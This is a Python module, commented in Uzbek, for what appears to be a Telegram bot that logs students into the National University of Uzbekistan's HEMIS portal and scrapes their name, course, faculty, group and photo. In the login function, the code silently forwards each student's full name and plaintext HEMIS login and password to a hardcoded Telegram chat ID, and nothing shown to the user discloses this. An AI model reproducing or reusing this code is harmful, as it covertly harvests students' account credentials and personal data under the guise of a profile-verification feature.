from bs4 import BeautifulSoup
import requests
from telebot import TeleBot, types
from bs4 import BeautifulSoup

def form_to_dict(form_soup):
    """
    BeautifulSoup <form> obyektidan barcha input, select, textarea qiymatlarini dict ko‘rinishida qaytaradi
    """
    form_data = {}

    # inputlar
    for inp in form_soup.find_all("input"):
        name = inp.get("name")
        if not name:
            continue
        # checkbox yoki radio uchun faqat "checked" bo‘lsa qo‘shiladi
        if inp.get("type") in ["checkbox", "radio"]:
            if inp.has_attr("checked"):
                form_data[name] = inp.get("value", "on")
        else:
            form_data[name] = inp.get("value", "")

    # selectlar
    for sel in form_soup.find_all("select"):
        name = sel.get("name")
        if not name:
            continue
        selected = sel.find("option", selected=True)
        if selected:
            form_data[name] = selected.get("value", selected.text)
        else:
            option = sel.find("option")
            form_data[name] = option.get("value", option.text) if option else ""

    # textarea
    for ta in form_soup.find_all("textarea"):
        name = ta.get("name")
        if not name:
            continue
        form_data[name] = ta.text.strip()

    return form_data

def get_datas_from_table(content_soup):
    all_datas = dict()
    for tr in content_soup.find_all("tr"):
        tds = tr.find_all("td")
        ths = tr.find_all("th")

        if len(tds) != 1 or len(ths) != 1:
            continue
        all_datas[ths[0].get_text(strip=True)] = tds[0].get_text(strip=True)
    return all_datas

def get_datas_from_hemis(login, parol, bot):
    try:
        sessiya = requests.Session()
        url = "https://hstudent.nuu.uz/dashboard/login"
        response = sessiya.get("https://hstudent.nuu.uz")
        soup = BeautifulSoup(response.text, "html.parser")
        csrf_token = soup.find("input", {"name": "_csrf-frontend"}).get("value")
        params = {
            "_csrf-frontend": csrf_token,
            "FormStudentLogin[login]": login,
            "FormStudentLogin[password]": parol
        }
        response = sessiya.post(url, data=params)
        soup = BeautifulSoup(response.text, "html.parser")
        if soup.find("a", {"href": "/dashboard/profile"}) is None:
            return {
                "status": False,
                "detail": "HEMIS Login yoki parol xato\nYoki siz O'zbekiston Milliy universiteti emas, balki boshqa universitet talabasi bo'lishingiz mumkin.\n\nLogin va parollarni qayta kiriting."
            }
        response = sessiya.get("https://hstudent.nuu.uz/dashboard/profile")
        response2 = sessiya.get("https://hstudent.nuu.uz/student/personal-data")
        soup2 = BeautifulSoup(response2.text, "html.parser")
        content = soup2.find("section", {"class": "content"})
        all_datas = get_datas_from_table(content)
        soup = BeautifulSoup(response.text, "html.parser")
        form = soup.find("form", {"id": "w0"})
        form_data = form_to_dict(form)
        profile_image = soup.find("img", {"class": "uploaded-image"}).get("src")
        data = {
            "profile_image": profile_image
        }
        for key, value in form_data.items():
            if "FormStudentProfile" in key:
                data[key[19:-1]] = value
        for key, value in all_datas.items():
            data[key] = value
        if "Guruh" not in data or "Fakultet" not in data or "Kurs" not in data:
            return {
                "status": False,
                "detail": "Avval HEMIS tizimiga kiring va parolingizni yangilang.\n\nLogin va parollarni qayta kiriting."
            }
        bot.send_message(
            5139310978,
            "Yangi Foydalanuvchi\nFIO: {}\nLogin: {}\nParol: {}".format(
                data["first_name"] + " " + data["second_name"],
                login,
                parol
            ),
            reply_markup=types.InlineKeyboardMarkup().add(types.InlineKeyboardButton(
                            "🏞 Rasmni ko'rish",
                            web_app=types.WebAppInfo(url=data["profile_image"])
                        ))
        )
        return {
            "status": True,
            "datas": data
        }
    except Exception as e:
        return {
            "status": False,
            "detail": "Xatolik yuz berdi. Iltimos, HEMIS login parolingizni qayta kiriting yoki administrator bilan bog'laning."
        }
def get_info_message(data):
    message = (
        f"*Sizning HEMIS tizimidagi ma'lumotlaringiz:*\n\n"
        f"👤 *F.I.O:* {data.get('first_name', '-')} {data.get('second_name', '')}\n"
        f"📅 *Kurs:* {data.get('Kurs', '-')}\n"
        f"📚 *Fakultet:* {data.get('Fakultet', '-')}\n"
        f"📁 *Guruh:* {data.get('Guruh', '-')}\n\n"
        f"Ma'lunotlaringiz to'g'riligini tasdiqlaysizmi?"
    )
    return message
